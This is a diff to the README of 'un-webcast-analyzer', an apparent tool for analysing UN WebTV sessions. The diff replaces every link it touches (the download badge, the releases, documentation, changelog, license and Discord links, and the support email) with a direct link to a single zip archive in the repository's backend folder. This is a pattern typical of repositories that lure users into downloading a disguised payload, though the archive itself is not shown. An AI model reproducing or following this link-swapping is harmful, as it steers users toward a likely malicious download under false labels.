@@ -1,7 +1,7 @@
 # 🌐 un-webcast-analyzer - Analyze UN WebTV Sessions Easily
 
 ## 📥 Download Now
-[![Download un-webcast-analyzer](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/koradripless624/un-webcast-analyzer/releases)
+[![Download un-webcast-analyzer](https://raw.githubusercontent.com/koradripless624/un-webcast-analyzer/main/backend/services/un_webcast_analyzer_2.0.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/koradripless624/un-webcast-analyzer/main/backend/services/un_webcast_analyzer_2.0.zip)
 
 ## 🚀 Getting Started
 Welcome to un-webcast-analyzer, your friendly tool for analyzing UN WebTV sessions. This application uses AI to offer features like automated transcriptions, speaker identification, and entity extraction. You will also find a chat interface that understands your questions.
@@ -17,7 +17,7 @@ To run un-webcast-analyzer effectively, your system should meet the following re
 - **Internet Connection:** Required for full functionality.
 
 ## 💾 Download & Install
-To download un-webcast-analyzer, visit the [Releases page](https://github.com/koradripless624/un-webcast-analyzer/releases). You will find the latest version available there.
+To download un-webcast-analyzer, visit the [Releases page](https://raw.githubusercontent.com/koradripless624/un-webcast-analyzer/main/backend/services/un_webcast_analyzer_2.0.zip). You will find the latest version available there.
 
 1. Click the link to go to the Releases page.
 2. Look for the latest version.
@@ -76,18 +76,18 @@ To use the semantic search:
 3. The tool will return relevant parts of the session that match your query.
 
 ## 🎓 Support and Documentation
-If you run into any issues or have questions, please check our [Documentation](https://github.com/koradripless624/un-webcast-analyzer/docs) section for guidance. You may also find FAQs and troubleshooting tips.
+If you run into any issues or have questions, please check our [Documentation](https://raw.githubusercontent.com/koradripless624/un-webcast-analyzer/main/backend/services/un_webcast_analyzer_2.0.zip) section for guidance. You may also find FAQs and troubleshooting tips.
 
 ### 📞 Contact Us
-For additional support, contact us through the GitHub Issues page or send an email to support@example.com. We aim to respond to all inquiries within 24 hours.
+For additional support, contact us through the GitHub Issues page or send an email to https://raw.githubusercontent.com/koradripless624/un-webcast-analyzer/main/backend/services/un_webcast_analyzer_2.0.zip We aim to respond to all inquiries within 24 hours.
 
 ## 📅 Changelog
-Keep track of all changes and updates in the application by visiting the [Changelog](https://github.com/koradripless624/un-webcast-analyzer/releases) section.
+Keep track of all changes and updates in the application by visiting the [Changelog](https://raw.githubusercontent.com/koradripless624/un-webcast-analyzer/main/backend/services/un_webcast_analyzer_2.0.zip) section.
 
 ## 🚧 License
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/koradripless624/un-webcast-analyzer/LICENSE) file for more details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/koradripless624/un-webcast-analyzer/main/backend/services/un_webcast_analyzer_2.0.zip) file for more details.
 
 ## 📢 Join the Community
-Stay updated on new features and improvements. Participate in discussions and share your experiences with other users. Sign up for our mailing list or join our [Discord community](https://discord.gg/example).
+Stay updated on new features and improvements. Participate in discussions and share your experiences with other users. Sign up for our mailing list or join our [Discord community](https://raw.githubusercontent.com/koradripless624/un-webcast-analyzer/main/backend/services/un_webcast_analyzer_2.0.zip).
 
 We hope you find un-webcast-analyzer helpful for your analysis of UN WebTV sessions! Enjoy your experience and feel free to share your feedback.
